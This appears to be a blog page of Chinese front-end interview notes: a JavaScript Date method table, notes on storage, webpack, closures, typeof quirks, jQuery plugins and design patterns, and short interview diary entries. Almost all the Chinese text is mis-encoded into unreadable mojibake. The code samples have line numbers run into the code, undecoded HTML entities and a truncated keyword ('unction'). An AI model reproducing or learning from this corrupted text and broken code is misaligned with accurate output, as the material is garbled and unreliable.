getUTCMilliseconds() | æ ¹æ®ä¸–ç•Œæ—¶è¿”å›ž Date å¯¹è±¡çš„æ¯«ç§’(0 ~ 999)ã€‚ || parse() | è¿”å›ž1970å¹´1æœˆ1æ—¥åˆå¤œåˆ°æŒ‡å®šæ—¥æœŸï¼ˆå­—ç¬¦ä¸²ï¼‰çš„æ¯«ç§’æ•°ã€‚ || setDate() | è®¾ç½® Date å¯¹è±¡ä¸­æœˆçš„æŸä¸€å¤© (1 ~ 31)ã€‚ || setMonth() | è®¾ç½® Date å¯¹è±¡ä¸­æœˆä»½ (0 ~ 11)ã€‚ || setFullYear() | è®¾ç½® Date å¯¹è±¡ä¸­çš„å¹´ä»½ï¼ˆå››ä½æ•°å­—ï¼‰ã€‚ || setYear() | è¯·ä½¿ç”¨ setFullYear() æ–¹æ³•ä»£æ›¿ã€‚ || setHours() | è®¾ç½® Date å¯¹è±¡ä¸­çš„å°æ—¶ (0 ~ 23)ã€‚ || setMinutes() | è®¾ç½® Date å¯¹è±¡ä¸­çš„åˆ†é’Ÿ (0 ~ 59)ã€‚ || setSeconds() | è®¾ç½® Date å¯¹è±¡ä¸­çš„ç§’é’Ÿ (0 ~ 59)ã€‚ || setMilliseconds() | è®¾ç½® Date å¯¹è±¡ä¸­çš„æ¯«ç§’ (0 ~ 999)ã€‚ || setTime() | ä»¥æ¯«ç§’è®¾ç½® Date å¯¹è±¡ã€‚ || setUTCDate() | æ ¹æ®ä¸–ç•Œæ—¶è®¾ç½® Date å¯¹è±¡ä¸­æœˆä»½çš„ä¸€å¤© (1 ~ 31)ã€‚ || setUTCMonth() | æ ¹æ®ä¸–ç•Œæ—¶è®¾ç½® Date å¯¹è±¡ä¸­çš„æœˆä»½ (0 ~ 11)ã€‚ || setUTCFullYear() | æ ¹æ®ä¸–ç•Œæ—¶è®¾ç½® Date å¯¹è±¡ä¸­çš„å¹´ä»½ï¼ˆå››ä½æ•°å­—ï¼‰ã€‚ || setUTCHours() | æ ¹æ®ä¸–ç•Œæ—¶è®¾ç½® Date å¯¹è±¡ä¸­çš„å°æ—¶ (0 ~ 23)ã€‚ || setUTCMinutes() | æ ¹æ®ä¸–ç•Œæ—¶è®¾ç½® Date å¯¹è±¡ä¸­çš„åˆ†é’Ÿ (0 ~ 59)ã€‚ || setUTCSeconds() | æ ¹æ®ä¸–ç•Œæ—¶è®¾ç½® Date å¯¹è±¡ä¸­çš„ç§’é’Ÿ (0 ~ 59)ã€‚ || setUTCMilliseconds() | æ ¹æ®ä¸–ç•Œæ—¶è®¾ç½® Date å¯¹è±¡ä¸­çš„æ¯«ç§’ (0 ~ 999)ã€‚ || toSource() | è¿”å›žè¯¥å¯¹è±¡çš„æºä»£ç ã€‚ || toString() | æŠŠ Date å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ || toTimeString() | æŠŠ Date å¯¹è±¡çš„æ—¶é—´éƒ¨åˆ†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ || toDateString() | æŠŠ Date å¯¹è±¡çš„æ—¥æœŸéƒ¨åˆ†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ || toGMTString() | è¯·ä½¿ç”¨ toUTCString() æ–¹æ³•ä»£æ›¿ã€‚ || toUTCString() | æ ¹æ®ä¸–ç•Œæ—¶ï¼ŒæŠŠ Date å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ || toLocaleString() | æ ¹æ®æœ¬åœ°æ—¶é—´æ ¼å¼ï¼ŒæŠŠ Date å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ || toLocaleTimeString() | æ ¹æ®æœ¬åœ°æ—¶é—´æ ¼å¼ï¼ŒæŠŠ Date å¯¹è±¡çš„æ—¶é—´éƒ¨åˆ†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ || toLocaleDateString() | æ ¹æ®æœ¬åœ°æ—¶é—´æ ¼å¼ï¼ŒæŠŠ Date å¯¹è±¡çš„æ—¥æœŸéƒ¨åˆ†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ || UTC() | æ ¹æ®ä¸–ç•Œæ—¶è¿”å›ž 1970 å¹´ 1 æœˆ 1 æ—¥ åˆ°æŒ‡å®šæ—¥æœŸçš„æ¯«ç§’æ•°ã€‚ || valueOf() | è¿”å›ž Date å¯¹è±¡çš„åŽŸå§‹å€¼ã€‚ | CTRL+F5åˆ·æ–°æ˜¯æŒ‡æ¸…ç©ºç¼“å­˜ head é‡Œé¢ æ˜¯å¿…é¡»çš„ localStorage sessionStorage APIä¸€è‡´ éƒ½ä¸è·¨åŸŸ ä¸è·¨æµè§ˆå™¨ storageå¤§å°ç›¸åŒ å¯ä»¥ç”¨æ ˆå’Œé˜Ÿåˆ—æ¨¡æ‹Ÿé€’å½’ å¦‚æžœçˆ¶å…ƒç´ æœ‰{display: none;}çš„æ ·å¼çš„è¯ï¼Œå­å…ƒç´ åœ¨æ ·å¼è¡¨ä¸­çš„èƒŒæ™¯å›¾ç‰‡æ—¢ä¸ä¼šæ¸²æŸ“ä¹Ÿä¸ä¼šåŠ è½½ï¼Œä½†æ˜¯æ ‡ç­¾ä¸Šçš„å›¾ç‰‡ä¼šè¢«åŠ è½½ä¸ä¼šè¢«æ¸²æŸ“ 09.23é˜¿é‡Œç”µè¯é¢ é¢äº†ä¸€ä¸ªå°æ—¶ï¼Œè‡ªæˆ‘æ„Ÿè§‰è‰¯å¥½ï¼Œä½†æ˜¯åˆ°çŽ°åœ¨æ²¡å›žéŸ³ï¼ŒGGï¼Œå”¯ä¸€ä¸æ‡‚çš„è²Œä¼¼æ˜¯è¿™ä¸ª äº‘ï¼Œæ··åˆäº‘ ç§æœ‰äº‘ç­‰æ¦‚å¿µ 09.254399 webscoket åŒæºï¼Ÿ åŒæºæ£€æµ‹ ä¸åŒæ–‡ä»¶å¤¹ä¸‹ æ¦‚çŽ‡ ç›’æ¨¡åž‹ borderbox width:200 padding:200 width=200px SEO å¼‚æ­¥ä¸åˆ©äºŽ è‡ªé—­ å°è£… åè¿›åˆ¶åå…­è¿›åˆ¶ JQ offset position sass chunkså°±æ˜¯ä»£ç å—çš„æ„æ€ï¼Œå¤šä¸ªchunkåˆåœ¨ä¸€èµ·å°±æ˜¯bundlewebpack-dev-server æ”¯æŒ2ç§è‡ªåŠ¨åˆ·æ–°çš„æ–¹å¼ï¼š Iframe mode inline mode è¿™2ç§æ¨¡å¼é…ç½®çš„æ–¹å¼å’Œè®¿é—®çš„è·¯å¾„ç¨å¾®æœ‰ç‚¹åŒºåˆ«ï¼Œæœ€ä¸»è¦çš„åŒºåˆ«è¿˜æ˜¯ Iframe mode æ˜¯åœ¨ç½‘é¡µä¸­åµŒå…¥äº†ä¸€ä¸ª iframe ï¼Œå°†æˆ‘ä»¬è‡ªå·±çš„åº”ç”¨æ³¨å…¥åˆ°è¿™ä¸ª iframe å½“ä¸­åŽ»ï¼Œå› æ­¤æ¯æ¬¡ä½ ä¿®æ”¹çš„æ–‡ä»¶åŽï¼Œéƒ½æ˜¯è¿™ä¸ª iframe è¿›è¡Œäº† reload ã€‚è€Œ Inline-mode ï¼Œæ˜¯ webpack-dev-server ä¼šåœ¨ä½ çš„ webpack.config.js çš„å…¥å£é…ç½®æ–‡ä»¶ä¸­å†æ·»åŠ ä¸€ä¸ªå…¥å£,ä¸è¿‡ Iframe mode å’Œ Inline mode æœ€åŽè¾¾åˆ°çš„æ•ˆæžœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ç›‘å¬æ–‡ä»¶çš„å˜åŒ–ï¼Œç„¶åŽå†å°†ç¼–è¯‘åŽçš„æ–‡ä»¶æŽ¨é€åˆ°å‰ç«¯ï¼Œå®Œæˆé¡µé¢çš„ reload çš„ã€‚ æ—  [1&lt;2&lt;3,3&lt;2&lt;1][true, true] function foo(){}a = foo.nameconsole.log(a)//foofoo.name=â€barâ€console.log([a,foo.name])//[â€œfooâ€, â€œfooâ€] è·¨åŸŸ this localStorageAPI nå¯¹æ‹¬å·ï¼Œä¸­é—´æ’å…¥4399ï¼Œè¾“å‡ºæ•°ç»„ requestAnimationFrame CSS animation ç§»åŠ¨äº‘è®¡ç®—ä¸¤é¢ï¼Œé¢è¯•å®˜å¯¹åŒ–å­¦ä¸“ä¸šèƒŒæ™¯çš„å…´è¶£æ¯”æŠ€æœ¯é—®é¢˜è¿˜å¤§ï¼Œä¼°è®¡GG ä¸€ç»„æœ‰ä¼˜å…ˆçº§æ•°æ®çš„å­˜å‚¨ å•ç‚¹ç™»å½• ReactÂ·vue ç‰¹ç‚¹ vueç»„ä»¶é€šä¿¡ HTTPè¯·æ±‚å¤´ popoverç»„ä»¶çˆ¶å…ƒç´ overflowï¼šhiddenæƒ…å†µçš„å¤„ç† 09.26æ­¥æ­¥é«˜1234567891011unction fn()&#123; var n = 99 function add()&#123; n+=1 &#125; function fn1()&#123; console.log(n) &#125; return fn1&#125;var result = fn()result()//99add()// Uncaught ReferenceError: add is not definedresult()//99 12345678910111213function Foo()&#123; function gN()&#123; console.log(1) &#125; //æ‰§è¡Œä¸Šä¸‹æ–‡ä¸€ç›´åœ¨Fooé‡Œé¢ä¸ä¼šç”¨ä¸Š return this&#125;Foo.gN = function()&#123; console.log(2) &#125;Foo.prototype.gN= function()&#123; console.log(3) &#125;var gN=function()&#123; console.log(4) &#125;function gN()&#123; console.log(5) &#125;Foo.gN()//2gN()//4Foo().gN()//4 this.gN() window.gN()gN()//4 1235-&quot;2&quot;//3&quot;21&quot;&gt;3//true~4//-5 ~æ˜¯æŒ‰ä½å–å ^=æ˜¯å¼‚æˆ–è¿ç®—ï¼Œç›¸åŒå–0ï¼Œä¸åŒå–1 12let x,&#123;x:y=1&#125;=&#123;x&#125;;y;//1console.log(x,y)//undefined 1 12345678function test()&#123; let re=[] for(var i=0;i&lt;10;i++)&#123; re[i]=function()&#123;return i&#125; &#125; return re&#125;test()[5]()//10 12345678910111213typeof(undefined)//&quot;undefined&quot;typeof(function()&#123;&#125;)//&quot;function&quot;typeof(99)//&quot;number&quot;typeof(&#123;a:1&#125;)//&quot;object&quot;typeof bar()//&quot;function&quot;function bar()&#123; return foo function foo()&#123;&#125;&#125;typeof &quot;$&#123;&#123;Object&#125;&#125;&quot;//&quot;string&quot;typeof &quot;$&#123;&#123;Object&#125;&#125;&quot;.prototype//&quot;undefined&quot;typeof &quot;$&#123;&#123;Object&#125;&#125;&quot;.isPrototypeOf//&quot;function&quot; CSS3 2D è½¬æ¢ translate() rotate() scale() skew() matrix() html5è‡ªå®šä¹‰æ•°æ®å±žæ€§ dataå±žæ€§ 123&lt;li data-type=&quot;veg&quot; data-distance=&quot;2miles&quot; data-identifier=&quot;10318&quot;&gt; Salad King&lt;/li&gt; tabindex å®žä¾‹ å¸¦æœ‰æŒ‡å®šçš„ tab é”®å¯¼èˆªé¡ºåºçš„é“¾æŽ¥ contenteditableå¯ç¼–è¾‘ scope å±žæ€§è§„å®šæ­¤è¡¨å¤´å•å…ƒæ ¼æ˜¯å¦æ˜¯è¡Œã€åˆ—ã€è¡Œç»„æˆ–åˆ—ç»„çš„å¤´éƒ¨ã€‚ onKeyDown/Press/UP ä¸‰è€…åœ¨äº‹ä»¶çš„å“åº”ä¸Šè¿˜æœ‰ä¸€ç‚¹ä¸åŒï¼Œå°±æ˜¯onkeydown ã€onkeypressäº‹ä»¶å“åº”çš„æ—¶å€™è¾“å…¥çš„å­—ç¬¦å¹¶æ²¡æœ‰è¢«ç³»ç»ŸæŽ¥å—ï¼Œè€Œå“åº”onkeyupçš„æ—¶å€™ï¼Œè¾“å…¥æµå·²ç»è¢«ç³»ç»ŸæŽ¥å— onkeypress è¿™ä¸ªäº‹ä»¶åœ¨ç”¨æˆ·æŒ‰ä¸‹å¹¶æ”¾å¼€ä»»ä½•å­—æ¯æ•°å­—é”®æ—¶å‘ç”Ÿã€‚ç³»ç»ŸæŒ‰é’®ï¼ˆä¾‹å¦‚ï¼Œç®­å¤´é”®å’ŒåŠŸèƒ½é”®ï¼‰æ— æ³•å¾—åˆ°è¯†åˆ«ã€‚ onkeyup è¿™ä¸ªäº‹ä»¶åœ¨ç”¨æˆ·æ”¾å¼€ä»»ä½•å…ˆå‰æŒ‰ä¸‹çš„é”®ç›˜é”®æ—¶å‘ç”Ÿã€‚ onkeydown è¿™ä¸ªäº‹ä»¶åœ¨ç”¨æˆ·æŒ‰ä¸‹ä»»ä½•é”®ç›˜é”®ï¼ˆåŒ…æ‹¬ç³»ç»ŸæŒ‰é’®ï¼Œå¦‚ç®­å¤´é”®å’ŒåŠŸèƒ½é”®ï¼‰æ—¶å‘ç”Ÿã€‚ på—çŠ¶å…ƒç´  JQæ’ä»¶å¼€å‘ 1234567891011121314//1.ç›´æŽ¥ç»™jqueræ·»åŠ å…¨å±€å‡½æ•°jQuery.myAlert=function (str) &#123; alert(str);&#125;;//2.ç”¨extend()æ–¹æ³•ã€‚extendæ˜¯jqueryæä¾›çš„ä¸€ä¸ªæ–¹æ³•ï¼ŒæŠŠå¤šä¸ªå¯¹è±¡åˆå¹¶èµ·æ¥ï¼Œå‚æ•°æ˜¯objectjQuery.extend(&#123; myAlert2:function (str1) &#123; alert(str1); &#125;,&#125;);(function ($) &#123; $.fn.plugin=function () &#123; &#125;;&#125;)(jQuery); history.back()ä¸æ˜¯goback localstorage.clearä¸æ˜¯clearItem Web Notifications.ClearAll() Notifications API å…è®¸ç½‘é¡µæˆ–åº”ç”¨ç¨‹åºåœ¨ç³»ç»Ÿçº§åˆ«å‘é€åœ¨é¡µé¢å¤–éƒ¨æ˜¾ç¤ºçš„é€šçŸ¥;è¿™æ ·å³ä½¿åº”ç”¨ç¨‹åºç©ºé—²æˆ–åœ¨åŽå°ï¼ŒWebåº”ç”¨ç¨‹åºä¹Ÿä¼šå‘ç”¨æˆ·å‘é€ä¿¡æ¯ã€‚æœ¬æ–‡å°†ä»‹ç»åœ¨æ‚¨è‡ªå·±çš„åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨æ­¤APIçš„åŸºç¡€çŸ¥è¯†ã€‚ ä½¿ç”¨ FileReader() æž„é€ å™¨åŽ»åˆ›å»ºä¸€ä¸ªæ–°çš„ FileReader æ²¡æœ‰readDataæ–¹æ³• vueç”Ÿå‘½å‘¨æœŸ è®¾è®¡æ¨¡å¼ å·¥åŽ‚ å•ä¾‹ è£…é¥° ä¸­ä»‹ å•ä¾‹ä¸ºäº†ä¿è¯ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®žä¾‹ï¼Œå¦‚æžœä¸å­˜åœ¨ä¾¿ç›´æŽ¥è¿”å›žï¼Œå¦‚æžœå­˜åœ¨ä¾¿è¿”å›žä¸Šä¸€æ¬¡çš„å®žä¾‹ï¼Œå…¶ç›®çš„ä¸€èˆ¬æ˜¯ä¸ºäº†èµ„æºä¼˜åŒ–ã€‚ç±»å®žçŽ°æ˜¯æ­£ç»Ÿçš„å®žçŽ°ï¼Œä¸€èˆ¬æ˜¯æ”¾åˆ°ç±»ä¸Šï¼Œåšé™æ€æ–¹æ³•ã€‚åœ¨å®žé™…é¡¹ç›®ä¸­ï¼Œä¸€èˆ¬è¿™ä¸ªåº”ç”¨ä¼šåœ¨ä¸€äº›é€šç”¨UIä¸Šï¼Œæ¯”å¦‚maskï¼Œalertï¼Œtoastï¼Œloadingè¿™ç±»ç»„ä»¶ï¼Œè¿˜æœ‰å¯èƒ½æ˜¯ä¸€äº›è¯·æ±‚æ•°æ®çš„model è£…é¥°è€…æ¨¡å¼çš„æ„å›¾æ˜¯ä¸ºä¸€ä¸ªå¯¹è±¡åŠ¨æ€çš„å¢žåŠ ä¸€äº›é¢å¤–èŒè´£ï¼›æ˜¯ç±»ç»§æ‰¿çš„å¦å¤–ä¸€ç§é€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯ç¼–è¯‘æ—¶å€™å¢žåŠ è¡Œä¸ºï¼Œä¸€ä¸ªæ˜¯è¿è¡Œæ—¶å€™ã€‚ ä¸­ä»‹è€…ä¸Žä»£ç†æ¨¡å¼çš„åŒºåˆ«1ï¼Œä¸­ä»‹è€…æ¨¡å¼ï¼šAï¼ŒBä¹‹é—´çš„å¯¹è¯é€šè¿‡Cæ¥ä¼ è¾¾ã€‚A,Bå¯ä»¥äº’ç›¸ä¸è®¤è¯†ï¼ˆå‡å°‘äº†Aå’ŒBå¯¹è±¡é—´çš„è€¦åˆï¼‰2ï¼Œä»£ç†æ¨¡å¼ï¼šAè¦é€Bç¤¼ç‰©ï¼ŒA,Bäº’ç›¸ä¸è®¤è¯†ï¼Œé‚£ä¹ˆAå¯ä»¥æ‰¾Cæ¥å¸®å®ƒå®žçŽ°é€ç¤¼ç‰©çš„æ„¿æœ›ï¼ˆå°è£…äº†Aå¯¹è±¡ï¼‰]]></content>
  </entry>
</search>
